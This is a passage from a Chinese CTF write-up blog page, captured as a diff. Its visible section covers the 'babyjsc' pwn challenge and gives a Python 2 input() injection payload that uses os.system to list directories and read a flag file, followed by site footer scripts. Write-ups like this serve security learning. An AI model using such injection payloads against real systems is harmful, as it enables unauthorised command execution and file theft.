flag&#123;7e171d43-63b9-4e18-990e-6e14c2afe648&#125;</span></span><br></pre></td></tr></table></figure>
+<h1 id="pwn">Pwn</h1>
+<h2 id="babyjsc">babyjsc</h2>
+<p><strong>Python2</strong> 的 <strong>input</strong>
+有个命令执行漏洞，随便搜了个 <strong>Payload</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /home&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls /home/ctf&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /home/ctf/flag&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;c4e39be1-666e-43c4-bf9c-3b44bd280275&#125;</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020-WDB-Vermilion-Bird/" rel="prev" title="2020 网鼎杯 朱雀之战 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2020 网鼎杯 朱雀之战 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020-GACTF/" rel="next" title="2020 GACTF 部分题解">
+                  2020 GACTF 部分题解 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
